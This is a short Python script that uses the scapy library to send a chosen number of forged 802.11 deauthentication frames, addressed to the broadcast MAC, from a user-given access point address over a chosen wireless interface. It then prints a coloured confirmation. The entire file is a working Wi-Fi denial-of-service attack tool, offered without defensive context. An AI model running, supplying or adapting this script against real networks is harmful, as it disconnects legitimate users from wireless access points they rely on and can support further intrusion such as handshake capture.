#!/bin/python
from colorama import Fore , Style
from scapy.all import *
x = raw_input ( "\naddr2 , addr3 = " + Fore.YELLOW + Style.BRIGHT )
y = int ( raw_input ( Style.RESET_ALL + "count = " + Fore.YELLOW + Style.BRIGHT ) )
z = raw_input ( Style.RESET_ALL + "iface = " + Fore.YELLOW + Style.BRIGHT )
packet = RadioTap ( ) / Dot11 ( addr1 = "ff:ff:ff:ff:ff:ff" , addr2 = x , addr3 = x ) / Dot11Deauth ( )
sendp ( packet , count = y , iface = z , inter = .512 , verbose = 0 )
if y > 1 :
    print Fore.GREEN + Style.BRIGHT + "\n[+] " + Fore.YELLOW + Style.BRIGHT + str ( y ) + Style.RESET_ALL + " deauthentication frames were sent to the access point " + Fore.YELLOW + Style.BRIGHT + x + Style.RESET_ALL + "."
else :
    print Fore.GREEN + Style.BRIGHT + "\n[+] " + Style.RESET_ALL + "A deauthentication frame was sent to the access point " + Fore.YELLOW + Style.BRIGHT + x + Style.RESET_ALL + "."
